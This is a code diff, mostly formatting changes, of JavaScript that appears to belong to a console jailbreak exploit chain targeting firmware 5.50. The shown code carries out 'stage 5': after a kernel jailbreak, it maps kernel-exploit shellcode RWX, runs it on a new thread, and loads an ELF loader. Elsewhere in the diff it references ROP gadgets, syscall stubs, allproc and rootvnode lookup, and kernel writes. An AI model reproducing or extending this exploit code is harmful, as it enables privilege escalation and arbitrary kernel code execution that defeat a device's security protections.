-              (freed ? ", elfldr mapping released" : "")
-          : "shellcode thread still alive after " +
-              waited +
-              " ms; elfldr mapping left in place",
-      );
+      out.ok = true; out.shellRet = "n/a (thr_new has no join)";
+      flushMark("STAGE5-DONE", "spawn=thr_new-tid=" + hx(tid) +
+        "-exited=" + exited + "-waitedMs=" + waited +
+        "-elfldrUnmapped=" + freed,);
+      out.steps.push(exited ? "shellcode thread exited after " + waited +
+        " ms" + (freed ? ", elfldr mapping released" : "") :
+        "shellcode thread still alive after " + waited +
+          " ms; elfldr mapping left in place",);
       return out;
     }
 
@@ -8877,42 +8193,27 @@ export function makePoopsEngine(X) {
       attrBuf = alloc(0x100, "stage5-pthread-attr");
       const attrCalls = [
         ["init", PK.LK_SCE_PTHREAD_ATTR_INIT, [attrBuf.base]],
-        [
-          "stacksize",
-          PK.LK_SCE_PTHREAD_ATTR_SETSTACKSIZE,
-          [attrBuf.base, i64(0x80000, 0)],
-        ],
-        [
-          "detachstate",
-          PK.LK_SCE_PTHREAD_ATTR_SETDETACHSTATE,
-          [attrBuf.base, i64(0, 0)],
-        ],
+        ["stacksize", PK.LK_SCE_PTHREAD_ATTR_SETSTACKSIZE,
+          [attrBuf.base, i64(0x80000, 0)],],
+        ["detachstate", PK.LK_SCE_PTHREAD_ATTR_SETDETACHSTATE,
+          [attrBuf.base, i64(0, 0)],],
       ];
       for (const [label, off, argv] of attrCalls) {
         await runBuilt("stage5-pthread-attr-" + label, () => {
-          armRet(1);
-          emitCallAddr(lkb.add32(off), retPtr(0), ...argv);
+          armRet(1); emitCallAddr(lkb.add32(off), retPtr(0), ...argv);
         });
         const ar = retOf(0);
         flushMark("STAGE5-ATTR", label + "-ret=" + ar);
         if (ar !== 0) {
-          out.why = "scePthreadAttr " + label + " returned " + ar;
-          return out;
+          out.why = "scePthreadAttr " + label + " returned " + ar; return out;
         }
       }
     }
 
     await runBuilt("stage5-thrd-create", () => {
       armRet(1);
-      emitCallAddr(
-        tc.addr,
-        retPtr(0),
-        handleBuf.base,
-        attrBuf ? attrBuf.base : i64(0, 0),
-        entry,
-        args.base,
-        nameBuf.base,
-      );
+      emitCallAddr(tc.addr, retPtr(0), handleBuf.base,
+        attrBuf ? attrBuf.base : i64(0, 0), entry, args.base, nameBuf.base,);
     });
     const tcRet = retOf(0);
     const handle = r64(handleBuf.u8, 0);
@@ -8920,11 +8221,8 @@ export function makePoopsEngine(X) {
     if (attrBuf) {
       await runBuilt("stage5-pthread-attr-destroy", () => {
         armRet(1);
-        emitCallAddr(
-          lkb.add32(PK.LK_SCE_PTHREAD_ATTR_DESTROY),
-          retPtr(0),
-          attrBuf.base,
-        );
+        emitCallAddr(lkb.add32(PK.LK_SCE_PTHREAD_ATTR_DESTROY),
+          retPtr(0), attrBuf.base,);
       });
       flushMark("STAGE5-ATTR", "destroy-ret=" + retOf(0));
     }
@@ -8933,34 +8231,23 @@ export function makePoopsEngine(X) {
     if (tcRet !== 0) {
       out.why =
         (useSizedSceThread ? "scePthreadCreate" : "pthread_create_name_np") +
-        " returned " +
-        tcRet +
-        ", expected 0; shellcode did not run";
+        " returned " + tcRet + ", expected 0; shellcode did not run";
       return out;
     }
     out.steps.push("thread spawned, handle " + hx(handle));
-    flushMark(
-      "STAGE5-JOIN-PRE",
-      "handle=" + hx(handle) + "-about-to-join-the-shellcode-thread",
-    );
+    flushMark("STAGE5-JOIN-PRE",
+      "handle=" + hx(handle) + "-about-to-join-the-shellcode-thread",);
 
     await runBuilt("stage5-thrd-join", () => {
-      armRet(1);
-      emitCallAddr(tj.addr, retPtr(0), handle, retBuf.base, 0);
+      armRet(1); emitCallAddr(tj.addr, retPtr(0), handle, retBuf.base, 0);
     });
     const tjRet = retOf(0);
     const shellRet = r64(retBuf.u8, 0);
-    const retStorageReleased = unpin(
-      retBuf,
-      "pthread_join return value consumed",
-    );
+    const retStorageReleased = unpin(retBuf, "pthread_join return value consumed",);
     unpin(handleBuf, "pthread handle consumed");
-    out.ran = true;
-    out.ok = tjRet === 0;
-    out.shellRet = hx(shellRet);
-    out.steps.push(
-      "Thrd_join returned " + tjRet + ", shellcode returned " + hx(shellRet),
-    );
+    out.ran = true; out.ok = tjRet === 0; out.shellRet = hx(shellRet);
+    out.steps.push("Thrd_join returned " + tjRet +
+      ", shellcode returned " + hx(shellRet),);
 
     let freedElf = false;
     if (elfBase && elfMapped) {
@@ -8968,17 +8255,10 @@ export function makePoopsEngine(X) {
       freedElf = !ur.failed;
     }
     elfBase = null;
-    flushMark(
-      "STAGE5-DONE",
-      "joinRet=" +
-        tjRet +
-        "-shellcodeRet=" +
-        hx(shellRet) +
-        "-retStorageReleased=" +
-        retStorageReleased +
-        "-elfldrUnmapped=" +
-        freedElf,
-    );
+    flushMark("STAGE5-DONE", "joinRet=" + tjRet +
+      "-shellcodeRet=" + hx(shellRet) +
+      "-retStorageReleased=" + retStorageReleased +
+      "-elfldrUnmapped=" + freedElf,);
     if (!out.ok) out.why = "Thrd_join returned " + tjRet;
     return out;
   }
@@ -9012,7 +8292,6 @@ export function makePoopsEngine(X) {
     stage4,
     stage5,
     kwriteSlow,
-    dlsym,
     findAllproc,
     emitCallAddr,
     findRootvnode,
@@ -9198,9 +8477,11 @@ export function buildLadder(X, E) {
       }
       if (missing.length)
         return FAIL(
-          "missing syscall stubs in the 5.50 map: " + missing.join(", "),
+          "missing syscall stubs in the active firmware profile: "
+            + missing.join(", "),
         );
-      note("all stage 0-2 syscall stubs present in the 326-entry 5.50 map");
+      note("all stage 0-2 syscall stubs present in the active firmware profile ("
+        + Object.keys(P.syscalls).length + " entries)");
 
       const gadgets = [
         "pop rdi",
@@ -10366,7 +9647,7 @@ export function buildLadder(X, E) {
           "S2.7 did not run: fdescenttbl re-read failed, single " +
             "unrepeated read of the fd table base",
         );
-      note("the two pipe pointers are printed and discarded");
+      note("the two pipe pointers are retained in-process as Stage 3 input");
 
       return PASS(
         "fd_ofiles = " +
@@ -10493,38 +9774,22 @@ export function buildLadder(X, E) {
   });
 
   L.push({
-    key: "ps10_stage5",
-    label: "stage 5 -- load elfldr + run the kexp shellcode",
-    cls: "PAYLOAD",
-    hot: true,
+    key: "ps10_stage5", label: "stage 5 -- load elfldr + run the kexp shellcode",
+    cls: "PAYLOAD", hot: true,
     async run() {
       const mode = String(cfg.payload || "");
-      if (mode !== "1" && mode !== "dry")
-        return NA("stage 5 runs a payload, opt-in only");
-      if (!E.S.jailbroken)
-        return FAIL(
-          "stage 5 needs stage 4's jailbreak (getuid()==0); " +
-            "jitshm_create and an RWX mmap need it",
-        );
-
+      if (mode !== "1" && mode !== "dry") return NA("stage 5 runs a payload, opt-in only");
+      if (!E.S.jailbroken) return FAIL("stage 5 needs stage 4's jailbreak (getuid()==0); " +
+        "jitshm_create and an RWX mmap need it",);
       const r = await E.stage5({ dryRun: mode === "dry" });
       for (const st of r.steps) note(st);
       if (!r.ok) return FAIL("stage 5: " + r.why);
-
-      if (!r.ran)
-        return PASS(
-          "dry run: blobs staged, allproc found, shellcode " +
-            "mapped RWX, pthread entries located, argument block " +
-            "built",
-        );
-      return PASS(
-        "payload ran, shellcode returned " +
-          r.shellRet +
-          ". args: pipe fds, allproc, elfldr blob",
-      );
+      if (!r.ran) return PASS("dry run: blobs staged, allproc found, shellcode " +
+        "mapped RWX, pthread entries located, argument block " + "built",);
+      return PASS("payload ran, shellcode returned " + r.shellRet +
+        ". args: pipe fds, allproc, elfldr blob",);
     },
   });
-
   L.push({
     key: "ps7_report",
     label: "state report, cleanup, and the reboot verdict",
